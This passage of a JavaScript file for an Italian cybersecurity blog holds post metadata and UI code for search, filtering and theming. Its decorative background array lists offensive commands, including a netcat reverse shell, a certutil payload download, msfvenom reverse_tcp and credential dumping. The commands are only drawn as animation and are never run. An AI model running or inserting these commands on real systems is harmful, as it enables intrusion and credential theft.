    "tags":    ["PKI", "certificati", "CA", "TLS", "X.509", "firma digitale", "HTTPS"],
    "excerpt": "Perch\u00e9 il lucchetto HTTPS non \u00e8 garanzia assoluta. Come funziona la Public Key Infrastructure, il ruolo delle Certificate Authority e cosa succede quando la fiducia si rompe."
  },
  {
    "id":      "rust-crates-malicious-cicd-env",
    "title":   "Crates.io compromessa: pacchetti Rust malevoli esfiltravano variabili CI/CD",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Rust", "crates.io", "supply chain", "CI/CD", "variabili d'ambiente", "secrets"],
    "excerpt": "Decine di crate Rust malevoli pubblicati su crates.io esfiltravano variabili d'ambiente dai pipeline CI/CD, inclusi token e credenziali cloud. Rimossi dopo segnalazione."
  },
  {
    "id":      "storm-2561-seo-poisoning-vpn",
    "title":   "STORM-2561: campagna di SEO poisoning distribuisce falsi client VPN",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["SEO poisoning", "VPN", "malware", "STORM-2561", "download malevolo", "infostealer"],
    "excerpt": "Il gruppo STORM-2561 avvelena i risultati di ricerca per parole chiave VPN popolari. I siti posizionati distribuiscono client VPN trojanizzati con infostealer integrato."
  },
  {
    "id":      "stryker-handala-wiper-intune",
    "title":   "Stryker Medical colpita da wiper via Microsoft Intune: Handala Group",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Stryker", "Handala", "wiper", "Intune", "Microsoft", "medical", "APT"],
    "excerpt": "Il gruppo Handala sfrutta Microsoft Intune per distribuire un wiper nei sistemi di Stryker Medical. L'attacco evidenzia i rischi del mobile device management compromesso."
  },
  {
    "id":      "trump-cyber-strategy-offensive-privati",
    "title":   "La strategia cyber USA: Trump apre alle offensive del settore privato",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["USA", "cyber strategy", "Trump", "offensiva", "settore privato", "geopolitica"],
    "excerpt": "La nuova direttiva cybersecurity americana allenta i vincoli sulle operazioni offensive e apre alla partecipazione di soggetti privati. Le implicazioni per l'equilibrio cyber globale."
  },
  {
    "id":      "unc6426-github-aws-supply-chain",
    "title":   "UNC6426: attacco supply chain via GitHub Actions e credenziali AWS",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["UNC6426", "GitHub Actions", "AWS", "supply chain", "CI/CD", "secrets theft"],
    "excerpt": "Il gruppo UNC6426 sfrutta workflow GitHub Actions mal configurati per estrarre credenziali AWS e muoversi lateralmente nell'infrastruttura cloud delle vittime."
  },
  {
    "id":      "zestix-iab-credenziali-aviazione-difesa",
    "title":   "Zestix: broker di accessi iniziali vende credenziali di difesa e aviazione italiana",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["IAB", "initial access broker", "aviazione", "difesa", "credenziali", "dark web", "Italia"],
    "excerpt": "L'Initial Access Broker noto come Zestix mette all'asta credenziali di accesso a sistemi di aziende italiane del settore aviazione e difesa su forum underground."
  },
  {
    "id":      "come-funziona-internet-v2",
    "title":   "Come funziona Internet \u2014 approfondimento: BGP, Anycast e la resilienza della rete",
    "date":    "2026-04-10",
    "cat":     "fond",
    "tags":    ["internet", "BGP", "anycast", "routing", "infrastruttura", "fondamentali"],
    "excerpt": "Secondo capitolo sull'infrastruttura di Internet: come il routing BGP decide il percorso dei pacchetti, cos'\u00e8 Anycast e perch\u00e9 Internet sopravvive ai guasti."
  },
  {
    "id":      "italia-sesta-ransomware-mondo-2025",
    "title":   "Italia 6\u00aa al mondo per attacchi ransomware: i dati del Y-Report 2026",
    "date":    "2026-05-12",
    "cat":     "news",
    "tags":    ["ransomware", "Y-Report", "Yarix", "statistiche", "manifatturiero", "RaaS"],
    "excerpt": "Lo Y-Report 2026 di Yarix certifica: l'Italia \u00e8 sesta al mondo per attacchi ransomware nel 2025, con 162 casi e un raddoppio rispetto all'anno precedente. Manifatturiero e tech i pi\u00f9 colpiti."
  }
];
// [POSTS:END]

/* ════════════════════════════════════════════════════════════
   pasta-cod3 — main.js v2.0
   Cyberpunk Canvas BG + Search + Filter + UI
   ════════════════════════════════════════════════════════════ */

'use strict';

/* ──────────────────────────────────────────────────────────
   ▶ POSTS DATA
   ──────────────────────────────────────────────────────────
   L'array POSTS è generato automaticamente da Jekyll
   tramite Liquid in index.html — non modificare qui.
   ────────────────────────────────────────────────────────── */


/* ──────────────────────────────────────────────────────────
   ▶ CYBERPUNK CANVAS BACKGROUND
   ────────────────────────────────────────────────────────── */

const CODE_FRAGMENTS = [
  "nmap -sV -sC -p- 10.10.10.1",
  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
  "cat /etc/passwd | grep -v nologin",
  "nc -lvnp 4444",
  "sudo -l",
  "find / -perm -4000 2>/dev/null",
  "ssh -L 8080:127.0.0.1:80 user@target",
  "hashcat -m 0 hash.txt rockyou.txt",
  "curl -s http://target/api/v1/users",
  "grep -rn 'password' /var/www/html/",
  "uname -a && id && whoami",
  "tcpdump -i eth0 port 80 -w cap.pcap",
  "gobuster dir -u http://target -w common.txt",
  "sqlmap -u 'http://target/?id=1' --dbs",
  "hydra -l admin -P rockyou.txt ssh://target",
  "msfconsole -q -x 'use exploit/multi/handler'",
  "john --wordlist=rockyou.txt hash.txt",
  "wpscan --url http://target --enumerate u",
  "enum4linux -a 10.10.10.1",
  "evil-winrm -i 10.10.10.1 -u admin -p 'P@ss'",
  "chisel server --port 8080 --reverse",
  "proxychains nmap -sT 172.16.0.0/24",
  "crackmapexec smb 10.10.10.0/24",
  "impacket-secretsdump domain/admin@10.10.10.1",
  "whoami /priv",
  "net user administrator /domain",
  "Get-ADUser -Filter * | Select Name",
  "tcpdump -i any -A -s0 port 80",
  "openssl s_client -connect target:443",
  "ss -tlpn | grep LISTEN",
  "ps aux --sort=-%cpu | head",
  "cat /proc/version",
  "arp -n | awk '{print $1}'",
  "ip route | grep -v 169",
  "ldapsearch -x -h 10.10.10.1 -b 'dc=domain,dc=local'",
  "dirsearch -u http://target -e php,html,txt",
  "ffuf -w wordlist.txt -u http://target/FUZZ",
  "certutil.exe -urlcache -f http://10.10.10.1/nc.exe",
  "powershell -enc JABjAGwAaQBlAG4AdA==",
  "nc 10.10.10.1 4444 -e /bin/bash",
  "python3 -m http.server 8080",
  "curl -X POST -d 'cmd=id' http://target/exec.php",
  "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.2",
  "burpsuite --headless --project-file=test.burp",
  "smbclient -L 10.10.10.1 -N",
  "rpcclient -U '' 10.10.10.1",
  "ldapdomaindump -u 'DOMAIN\\user' -p pass 10.10.10.1",
  "volatility -f mem.raw --profile=Win7 pslist",
  "binwalk -e firmware.bin",
  "strings binary | grep -i pass",
];

class CodeFrag {
  constructor(ctx, w, h, isMobile) {
    this.ctx = ctx;
    this.isMobile = isMobile;
    this.reset(w, h);
  }
  reset(w, h) {
    this.x = Math.random() * (w - 20) + 10;
    this.y = Math.random() * h;
    this.text = CODE_FRAGMENTS[Math.floor(Math.random() * CODE_FRAGMENTS.length)];
    this.displayed = '';
    this.charIdx = 0;
    this.opacity = 0;
    this.state = 'typing';   // typing | hold | fade
    this.typeTick = 0;
    this.typeRate = this.isMobile ? 3 : (2 + Math.random() * 3); // ticks per char
    this.holdMax  = 60 + Math.random() * 100;
    this.holdTick = 0;
    this.fadeRate = 0.008 + Math.random() * 0.01;
    this.fontSize = this.isMobile ? (9 + Math.random() * 2) : (9.5 + Math.random() * 3);
    this.bright   = Math.random() > 0.75;
  }
  update(w, h) {
    if (this.state === 'typing') {
      this.typeTick++;
      if (this.typeTick >= this.typeRate) {
        this.typeTick = 0;
        if (this.charIdx < this.text.length) this.charIdx++;
        this.displayed = this.text.slice(0, this.charIdx);
        this.opacity = Math.min(this.opacity + 0.025, this.bright ? 0.38 : 0.16);
        if (this.charIdx >= this.text.length) this.state = 'hold';
      }
    } else if (this.state === 'hold') {
      this.holdTick++;
      if (this.holdTick >= this.holdMax) this.state = 'fade';
    } else {
      this.opacity -= this.fadeRate;
      if (this.opacity <= 0) this.reset(w, h);
    }
  }
  draw() {
    const ctx = this.ctx;
    ctx.save();
    ctx.globalAlpha = Math.max(0, this.opacity);
    ctx.fillStyle   = this.bright ? '#00c8ff' : '#004466';
    ctx.font        = `${this.fontSize}px 'JetBrains Mono',monospace`;
    ctx.fillText(this.displayed + (this.state === 'typing' ? '▋' : ''), this.x, this.y);
    ctx.restore();
  }
}

function initCanvas() {
  const canvas = document.getElementById('spaceCanvas');
  if (!canvas) return;

  const ctx = canvas.getContext('2d');
  const prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  if (prefersReduced) { canvas.style.display = 'none'; return; }

  let W, H, frags = [], rafId;
  const isMobile = () => window.innerWidth < 768;
  const COUNT = () => isMobile() ? 8 : 22;

  function resize() {
    W = window.innerWidth;
    H = window.innerHeight;
    canvas.width  = W;
    canvas.height = H;
    canvas.style.width  = W + 'px';
    canvas.style.height = H + 'px';

    // Re-spread existing fragments
    frags.forEach(f => f.reset(W, H));
  }

  function init() {
    frags = [];
    const n = COUNT();
    for (let i = 0; i < n; i++) {
      const f = new CodeFrag(ctx, W, H, isMobile());
      // Stagger initial positions in time (vary opacity start)
      f.charIdx  = Math.floor(Math.random() * f.text.length);
      f.displayed = f.text.slice(0, f.charIdx);
      f.state = Math.random() > 0.5 ? 'hold' : 'typing';
      f.opacity = Math.random() * 0.25;
      frags.push(f);
    }
  }

  function loop() {
    ctx.clearRect(0, 0, W, H);
    frags.forEach(f => { f.update(W, H); f.draw(); });
    rafId = requestAnimationFrame(loop);
  }

  resize();
  init();
  loop();

  let resizeTimer;
  window.addEventListener('resize', () => {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => { resize(); init(); }, 200);
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ UTILS
   ────────────────────────────────────────────────────────── */

const CAT_LABEL = {
  'red':    'Red Team',
  'blue':   'Blue Team',
  'storia': 'Storia',
  'fond':   'Fondamentali',
  'news':   'Notizie',
};

function fmtDate(iso) {
  if (!iso) return '';
  const d = new Date(iso + 'T00:00:00');
  return d.toLocaleDateString('it-IT', { day:'2-digit', month:'short', year:'numeric' });
}

function buildCard(post) {
  return `
  <article class="article-card" data-cat="${post.cat}" role="listitem">
    <a href="posts/${post.id}.html" style="display:contents" tabindex="-1" aria-hidden="true"></a>
    <div class="article-cat-badge c-${post.cat.replace('-team','').replace('fondamentali','fond')}">${CAT_LABEL[post.cat] || post.cat}</div>
    <h3 class="article-title">
      <a href="posts/${post.id}.html">${post.title}</a>
    </h3>
    ${post.excerpt ? `<p class="article-excerpt">${post.excerpt}</p>` : ''}
    <div class="article-meta">
      <time class="article-date" datetime="${post.date}">${fmtDate(post.date)}</time>
      <div class="article-tags">
        ${(post.tags||[]).map(t=>`<span class="tag-chip" data-tag="${t}">${t}</span>`).join('')}
      </div>
    </div>
  </article>`;
}

function catClass(cat) {
  const m = { 'red':'c-red','blue':'c-blue','storia':'c-storia','fond':'c-fond','news':'c-news' };
  return m[cat] || '';
}


/* ──────────────────────────────────────────────────────────
   ▶ STATE
   ────────────────────────────────────────────────────────── */
let activeCat = '';
let activeTag = '';
let searchQ   = '';


/* ──────────────────────────────────────────────────────────
   ▶ RENDER
   ────────────────────────────────────────────────────────── */
function getFiltered() {
  return POSTS.filter(p => {
    const catOk = !activeCat || p.cat === activeCat;
    const tagOk = !activeTag || (p.tags||[]).includes(activeTag);
    const q     = searchQ.toLowerCase().trim();
    const srchOk = !q ||
      p.title.toLowerCase().includes(q) ||
      (p.excerpt||'').toLowerCase().includes(q) ||
      (p.tags||[]).some(t=>t.toLowerCase().includes(q));
    return catOk && tagOk && srchOk;
  });
}

function render() {
  const list = document.getElementById('articleList');
  const noR  = document.getElementById('noResults');
  if (!list) return;

  const filtered = getFiltered();

  // Sorted: newest first
  const sorted = [...filtered].sort((a,b) => (b.date||'').localeCompare(a.date||''));

  list.innerHTML = sorted.map(buildCard).join('');
  if (noR) noR.classList.toggle('visible', sorted.length === 0);

  // Section title
  const title = document.getElementById('articlesSectionTitle');
  if (title) {
    title.textContent = activeCat
      ? CAT_LABEL[activeCat] + ' — ' + sorted.length + ' articol' + (sorted.length===1?'o':'i')
      : 'Tutti gli articoli';
  }

  // Sidebar count
  const sc = document.getElementById('sidebarCount');
  if (sc) sc.textContent = sorted.length + ' articol' + (sorted.length===1?'o':'i');

  // Filter drawer count
  const fdb = document.getElementById('fdbCount');
  if (fdb) fdb.textContent = sorted.length;

  // Tag click on cards
  list.querySelectorAll('.tag-chip').forEach(chip => {
    chip.addEventListener('click', e => {
      e.preventDefault(); e.stopPropagation();
      const t = chip.dataset.tag;
      activeTag = activeTag === t ? '' : t;
      syncTagUI();
      render();
    });
  });

  // Card click → navigate
  list.querySelectorAll('.article-card').forEach(card => {
    card.addEventListener('click', e => {
      if (e.target.closest('a') || e.target.closest('.tag-chip')) return;
      const href = card.querySelector('a')?.href;
      if (href) window.location.href = href;
    });
    card.style.cursor = 'pointer';
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ COUNTS (stats + categories)
   ────────────────────────────────────────────────────────── */
function updateCounts() {
  const counts = {};
  POSTS.forEach(p => { counts[p.cat] = (counts[p.cat]||0) + 1; });

  const map = {
    'red':    ['cnt-red','cc-red'],
    'blue':   ['cnt-blue','cc-blue'],
    'storia': ['cnt-storia','cc-storia'],
    'fond':   ['cnt-fond','cc-fond'],
    'news':   ['cnt-news','cc-news'],
  };
  Object.entries(map).forEach(([cat,[statId,catId]]) => {
    const n = counts[cat]||0;
    const se = document.getElementById(statId); if(se) se.textContent = n;
    const ce = document.getElementById(catId);  if(ce) ce.textContent = n + ' articol' + (n===1?'o':'i');
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ TAGS
   ────────────────────────────────────────────────────────── */
function buildTagsUI() {
  const allTags = [...new Set(POSTS.flatMap(p=>p.tags||[]))].sort();
  ['sidebarTags','filterSheetTags'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.innerHTML = allTags.map(t=>
      `<span class="tag-chip${t===activeTag?' active':''}" data-tag="${t}">${t}</span>`
    ).join('');
    el.querySelectorAll('.tag-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        const t = chip.dataset.tag;
        activeTag = activeTag === t ? '' : t;
        syncTagUI();
        render();
      });
    });
  });
}

function syncTagUI() {
  document.querySelectorAll('.tag-chip').forEach(c => {
    c.classList.toggle('active', c.dataset.tag === activeTag);
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ CAT FILTER
   ────────────────────────────────────────────────────────── */
function syncCatUI() {
  ['sidebarCats','filterSheetCats'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.querySelectorAll('[data-cat]').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.cat === activeCat);
    });
  });
  // Nav links
  document.querySelectorAll('[data-cat]').forEach(a => {
    if (a.tagName !== 'BUTTON') return;
  });
  // Reset button
  const rb = document.getElementById('resetFilter');
  if (rb) rb.style.display = (activeCat||activeTag) ? '' : 'none';
}

function setCategory(cat) {
  activeCat = cat;
  activeTag = '';
  syncCatUI();
  syncTagUI();
  render();
  // Scroll to articles on mobile
  if (window.innerWidth < 920) {
    const el = document.getElementById('articles');
    if (el) el.scrollIntoView({ behavior:'smooth', block:'start' });
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ SEARCH
   ────────────────────────────────────────────────────────── */
function runSearch(q, dropdownId) {
  const dd = document.getElementById(dropdownId);
  if (!dd) return;
  if (!q.trim()) { dd.innerHTML = ''; return; }

  const results = POSTS
    .filter(p =>
      p.title.toLowerCase().includes(q.toLowerCase()) ||
      (p.tags||[]).some(t=>t.toLowerCase().includes(q.toLowerCase())) ||
      (p.excerpt||'').toLowerCase().includes(q.toLowerCase())
    )
    .slice(0, 6);

  if (!results.length) {
    dd.innerHTML = `<div class="search-result-item" style="color:var(--text-dim);cursor:default">Nessun risultato</div>`;
    return;
  }
  dd.innerHTML = results.map(p => `
    <a class="search-result-item" href="posts/${p.id}.html">
      <span class="search-result-cat ${catClass(p.cat)}">${CAT_LABEL[p.cat]||p.cat}</span>
      ${p.title}
    </a>
  `).join('');
}

function initSearch() {
  // Desktop
  const inp = document.getElementById('searchInput');
  const dd  = document.getElementById('searchDropdown');
  if (inp) {
    inp.addEventListener('input', e => { searchQ = e.target.value; render(); runSearch(searchQ,'searchDropdown'); });
    inp.addEventListener('keydown', e => {
      if (e.key==='Escape') { inp.value=''; searchQ=''; dd.innerHTML=''; render(); inp.blur(); }
    });
  }
  // Mobile
  const inpM = document.getElementById('searchInputMobile');
  if (inpM) {
    inpM.addEventListener('input', e => { searchQ = e.target.value; render(); runSearch(searchQ,'searchDropdownMobile'); });
  }
  // Close dropdown on outside click
  document.addEventListener('click', e => {
    if (!e.target.closest('#searchWrap')) {
      const d = document.getElementById('searchDropdown'); if(d) d.innerHTML='';
    }
    if (!e.target.closest('#searchMobileBar')) {
      const d = document.getElementById('searchDropdownMobile'); if(d) d.innerHTML='';
    }
  });
  // Keyboard shortcut K
  document.addEventListener('keydown', e => {
    if ((e.metaKey||e.ctrlKey) && e.key==='k') {
      e.preventDefault();
      const si = document.getElementById('searchInput');
      const sm = document.getElementById('searchMobileBar');
      if (window.innerWidth >= 920 && si) {
        si.focus(); si.select();
      } else if (sm) {
        sm.classList.add('open');
        const m = document.getElementById('searchInputMobile');
        if(m){ m.focus(); m.select(); }
      }
    }
  });
}

function initSearchToggle() {
  const btn = document.getElementById('searchToggleBtn');
  const bar = document.getElementById('searchMobileBar');
  if (!btn || !bar) return;

  function focusMobileInput() {
    const inp = document.getElementById('searchInputMobile');
    if (!inp) return;
    // Doppio tentativo: subito + dopo rendering
    inp.removeAttribute('readonly');
    inp.focus();
    setTimeout(() => { inp.focus(); inp.click(); }, 320);
  }

  btn.addEventListener('click', () => {
    const open = bar.classList.toggle('open');
    btn.setAttribute('aria-expanded', String(open));
    if (open) focusMobileInput();
  });

  // Tocca direttamente sull'input per sicurezza su Android
  const inp = document.getElementById('searchInputMobile');
  if (inp) {
    inp.addEventListener('touchstart', () => inp.focus(), { passive: true });
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ NAV & MOBILE DRAWER
   ────────────────────────────────────────────────────────── */
function initNav() {
  const burger  = document.getElementById('hamburger');
  const overlay = document.getElementById('navOverlay');
  const drawer  = document.getElementById('navDrawer');

  function openNav() {
    drawer?.classList.add('open');
    overlay?.classList.add('active');
    burger?.classList.add('open');
    burger?.setAttribute('aria-expanded','true');
    document.body.style.overflow = 'hidden';
  }
  function closeNav() {
    drawer?.classList.remove('open');
    overlay?.classList.remove('active');
    burger?.classList.remove('open');
    burger?.setAttribute('aria-expanded','false');
    document.body.style.overflow = '';
  }

  burger?.addEventListener('click', () => burger.classList.contains('open') ? closeNav() : openNav());
  overlay?.addEventListener('click', closeNav);

  // Nav drawer category links
  drawer?.querySelectorAll('[data-cat]').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      const cat = a.dataset.cat;
      closeNav();
      window.location.href = 'index.html';
      sessionStorage.setItem('filterCat', cat);
    });
  });
}

function initFilterSheet() {
  const btn     = document.getElementById('filterDrawerBtn');
  const sheet   = document.getElementById('filterSheet');
  const overlay = document.getElementById('filterOverlay');
  const close   = document.getElementById('filterSheetClose');

  function openSheet() {
    sheet?.classList.add('open');
    overlay?.classList.add('active');
    btn?.setAttribute('aria-expanded','true');
    document.body.style.overflow = 'hidden';
  }
  function closeSheet() {
    sheet?.classList.remove('open');
    overlay?.classList.remove('active');
    btn?.setAttribute('aria-expanded','false');
    document.body.style.overflow = '';
  }

  btn?.addEventListener('click', openSheet);
  overlay?.addEventListener('click', closeSheet);
  close?.addEventListener('click', closeSheet);

  // Cat buttons in sheet
  document.querySelectorAll('#filterSheetCats [data-cat]').forEach(b => {
    b.addEventListener('click', () => {
      setCategory(b.dataset.cat);
      closeSheet();
    });
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ CATEGORY CLICK HANDLERS
   ────────────────────────────────────────────────────────── */
function initCatHandlers() {
  // Sidebar
  document.querySelectorAll('#sidebarCats [data-cat]').forEach(btn => {
    btn.addEventListener('click', () => setCategory(btn.dataset.cat));
  });
  // Category cards
  document.querySelectorAll('.cat-card[data-cat]').forEach(card => {
    card.addEventListener('click', () => {
      setCategory(card.dataset.cat);
      document.getElementById('articles')?.scrollIntoView({ behavior:'smooth' });
    });
    card.addEventListener('keydown', e => {
      if (e.key==='Enter'||e.key===' ') {
        e.preventDefault();
        setCategory(card.dataset.cat);
        document.getElementById('articles')?.scrollIntoView({ behavior:'smooth' });
      }
    });
  });
  // Stat boxes
  document.querySelectorAll('.stat-box[data-cat]').forEach(box => {
    box.addEventListener('click', () => {
      setCategory(box.dataset.cat);
      document.getElementById('articles')?.scrollIntoView({ behavior:'smooth' });
    });
    box.addEventListener('keydown', e => {
      if (e.key==='Enter'||e.key===' ') {
        e.preventDefault();
        setCategory(box.dataset.cat);
        document.getElementById('articles')?.scrollIntoView({ behavior:'smooth' });
      }
    });
  });
  // Nav links
  document.querySelectorAll('.nav-links [data-cat], .f-nav [data-cat]').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      setCategory(a.dataset.cat);
    });
  });
  // Reset
  document.getElementById('resetFilter')?.addEventListener('click', () => {
    activeCat = ''; activeTag = '';
    syncCatUI(); syncTagUI(); render();
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ THEME TOGGLE
   ────────────────────────────────────────────────────────── */
function initTheme() {
  const btn = document.getElementById('themeToggle');
  if (!btn) return;

  function applyTheme(t) {
    document.documentElement.setAttribute('data-theme', t);
    localStorage.setItem('theme', t);
    btn.textContent = t==='dark' ? '◐ LIGHT' : '◑ DARK';
  }

  const saved = localStorage.getItem('theme') || 'dark';
  applyTheme(saved);

  btn.addEventListener('click', () => {
    const cur = document.documentElement.getAttribute('data-theme');
    applyTheme(cur==='dark' ? 'light' : 'dark');
  });
}


/* ──────────────────────────────────────────────────────────
   ▶ RESTORE SESSION FILTER (from nav drawer nav)
   ────────────────────────────────────────────────────────── */
function restoreFilter() {
  const cat = sessionStorage.getItem('filterCat');
  if (cat) {
    sessionStorage.removeItem('filterCat');
    activeCat = cat;
  }
}


/* ──────────────────────────────────────────────────────────
   ▶ INIT
   ────────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  initCanvas();
  initTheme();
  restoreFilter();
  updateCounts();
  buildTagsUI();
  syncCatUI();
  render();
  initSearch();
  initSearchToggle();
  initNav();
  initFilterSheet();
  initCatHandlers();
});
